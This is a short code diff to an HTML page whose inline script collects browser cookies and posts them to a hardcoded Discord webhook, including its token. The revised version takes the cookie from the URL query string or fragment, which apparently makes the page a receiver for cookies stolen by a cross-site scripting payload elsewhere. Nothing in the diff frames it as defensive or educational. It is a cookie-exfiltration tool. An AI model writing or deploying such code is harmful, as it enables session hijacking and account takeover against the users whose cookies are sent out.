@@ -6,12 +6,16 @@
 </head>
 <body>
   <script>
-    const cookieData = document.cookie || '[Aucun cookie]';
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const hashParams = new URLSearchParams(window.location.hash.substring(1));
+    const cookie = urlParams.get('cookie') || hashParams.get('cookie') || '[No cookie]';
+
     fetch('https://discord.com/api/webhooks/1399087360490082378/x11chNJFs2z93FEqBEMoSqX0Pmh1ZoX9bbv1eTLq6R8AMyKbhSdKHKVIlkBIaDf7RDnT', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({content: `Cookie : ${cookieData}`})
-    }).catch(err => console.error('Erreur fetch webhook:', err));
+      body: JSON.stringify({content: `Cookie : ${cookie}`})
+    });
   </script>
 </body>
 </html>
